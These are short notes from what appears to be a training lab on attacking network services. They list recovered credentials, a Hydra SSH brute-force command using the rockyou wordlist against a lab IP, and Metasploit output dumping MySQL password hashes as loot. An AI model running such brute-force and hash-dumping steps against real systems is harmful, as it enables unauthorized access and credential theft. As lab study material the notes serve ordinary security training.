# Network Services 2

## SMTP

user: administrator
pw: alejandro

mailserver name: polosmtp.home 

MTA: Postfix

server OS: Ubuntu

target ip: 10.10.206.1

Hydra ssh bruteforce:

	hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.206.1 ssh


## MySQL

assume we found 

root:password

carl:doggie

mysql version: 5.7.29-0ubuntu0.18.04.1

[*] 10.10.94.146:3306 - Sending statement: 'show databases'...
[*] 10.10.94.146:3306 -  | information_schema |
[*] 10.10.94.146:3306 -  | mysql |
[*] 10.10.94.146:3306 -  | performance_schema |
[*] 10.10.94.146:3306 -  | sys |
[*] Auxiliary module execution completed

[+] 10.10.94.146:3306     - Saving HashString as Loot: root:
[+] 10.10.94.146:3306     - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.94.146:3306     - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.94.146:3306     - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.94.146:3306     - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.94.146:3306     - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.94.146:3306     - Scanned 1 of 1 hosts (100% complete)


